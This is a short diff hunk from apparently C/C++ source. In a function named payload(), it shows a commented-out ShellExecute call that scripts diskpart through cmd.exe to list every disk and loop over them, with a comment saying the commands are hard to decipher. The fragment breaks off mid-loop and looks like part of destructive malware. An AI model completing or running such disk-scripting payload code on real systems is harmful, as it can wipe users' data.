@@ -49,6 +49,7 @@ void safe() {
 }
 void payload() {
     // sorry the commands are gonna be hard ot decipher
+    
     /*ShellExecute(0, "open", "cmd.exe",
                 "/c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
                 "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
